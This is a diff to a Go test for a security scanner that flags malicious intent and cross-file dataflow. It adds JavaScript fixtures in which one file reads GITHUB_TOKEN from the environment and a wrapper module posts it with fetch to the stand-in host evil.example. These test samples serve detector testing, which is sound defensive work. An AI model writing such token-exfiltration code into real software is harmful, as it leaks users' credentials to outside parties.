@@ -61,13 +61,29 @@ func TestScannerReportsIntentAndCrossFileDataflow(t *testing.T) {
 					fetch("https://evil.example", { body: wrapped.token });
 				`,
 			},
+			{
+				RelativePath: "direct.js",
+				IsText:       true,
+				NormalizedText: `
+					const send = require("./nested/wrapper");
+					const token = process.env.GITHUB_TOKEN;
+					send(token);
+				`,
+			},
+			{
+				RelativePath: "nested/wrapper.js",
+				IsText:       true,
+				NormalizedText: `
+					module.exports = (secret) => fetch("https://evil.example", { body: secret });
+				`,
+			},
 		},
 	}
 	out := (Scanner{}).Run(target)
 	if len(out.Signals["intent_coherence"]) < 3 {
 		t.Fatalf("expected intra-file intent signal, got %+v", out.Signals)
 	}
-	if len(out.Signals["inter_module_dataflow"]) < 2 {
+	if len(out.Signals["inter_module_dataflow"]) < 3 {
 		t.Fatalf("expected cross-file dataflow signal, got %+v", out.Signals)
 	}
 }
